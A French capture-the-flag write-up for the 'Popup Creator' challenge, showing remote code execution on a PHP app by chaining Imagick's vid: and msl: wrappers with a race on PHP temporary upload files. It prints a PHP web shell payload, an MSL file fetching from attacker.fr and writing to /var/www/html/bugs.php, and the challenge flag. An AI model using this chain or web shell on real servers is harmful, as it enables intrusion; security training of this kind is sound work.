# Popup Creator

## Solve

Quand on télécharge le challenge, on remarque que celui-ci est codé en PHP sans framework connu (laravel, ...).

On remarque qu'il y a peu de code, et que le flag se situe à la racine du serveur, il faudra donc surement obtenir une exécution de code à distance.

On voit aussi qu'une SSRF est possible via l'outil, mais cela n'est pas utile dans ce challenge. Si l'on regarde dans les sources, la seule partie vraiment intéressante semble être celle ou le serveur s'occupe de traiter les images récupérées depuis le site spécifié par l'utilisateur :

```php
<?php

class ImageParser
{

    function __construct()
    {
        $this->img_data = [];
    }

    function parse_image($images)
    {
        foreach($images as $image)
        {
            try{
                $imagick = new Imagick($image);
                $imagick->resizeImage(25,25, 1, 1);
                array_push($this->img_data, base64_encode($imagick->getImageBlob()));
            }
            catch(Throwable $e){};
        }
    }
}
```

Ici, `$image` correspond au contenu de l'attribut `src` d'une balise `<img>` : `<img src="https://google.com/favicon.ico">`.
Néanmoins, le contenu de l'attribut n'est pas checké, on peut donc y mettre ce qu'on veut.

Si l'on s'intéresse à la documentation de Imagick, on voit que, dans le constructeur, on peut passer une URL, un fichier, ... mais on peut aussi utiliser des wrappers spéciaux définis internalement dans Imagick.
Deux de ces wrappers semblement prometteurs :

- `vid`: Utilise `ExandFilenames()`, ce qui signifie qu'on peut lui passer un nom de fichier avec des caractères spéciaux qui sera résolu, par exemple `/etc/passw*`
- `msl`: Pour `Magick Script Language`, permet de spécifier une source et un endroit ou écrire.

Un format msl ressemble à cela: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <image>
        <read filename="https://google.com/favicon.ico" />
        <write filename="/home/user/Pictures/favicon.ico" />
    </image>
```

A noter que l'attribut `read` doit etre une source d'image valide !

On peut donc, avec ce fichier là, télécharger un fichier depuis un site internet et l'écrire sur le filesystem ! Il est donc possible de créer une image jpg en y insérant un commentaire (à l'aide d'exiftool) contenant une payload PHP : `<?php var_dump(shell_exec($_GET['c'])); ?>`, et demander d'écrire dans `/var/www/html/bugs.php` (seul fichier pouvant être écris par l'utilisateur www-data).

Il reste ici un problème, le fichier que l'on spécifie dans `msl` doit être un fichier local de la machine, or, dans ce challenge, il n'y a aucun moyen d'uploader un fichier.

Dans PHP, lorsqu'on upload un fichier, et meme si aucun code ne va le traiter derrière, PHP créé un fichier temporaire, généralement sous le format `/tmp/phpXXXXXXXX`, `X` étant des caractères aléatoires.

On peut donc chain cela avec nos deux wrappers `vid` et `msl` pour effectuer une race condition et exécuté notre payload :

- Démarrer un serveur web qui héberge la page `index.html` suivante:

```html
<!DOCTYPE>
<head>
    <title>RCE</title>
<body>
    <img src="vid:msl:/tmp/php*">
</body>
```

- Dans ce serveur web hébergé aussi une image `rce.png` qui contient la payload dans les commentaires de l'image.
- Uploader en continu notre fichier `exec.msl` suivant :

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <image>
        <read filename="http://attacker.fr/rce.png" />
        <write filename="/var/www/html/bugs.php" />
    </image>
```

Vous pouvez retrouver le script de l'attaque dans le dossier `solve_zeecka`, merci beaucoup à Zeecka pour avoir écris la solution !

La race se gagne assez facilement, et on peut récupérer le flag.

## Flag

BZHCTF{1m4g1ck_1s_tr4g1ck_4g41n_!!}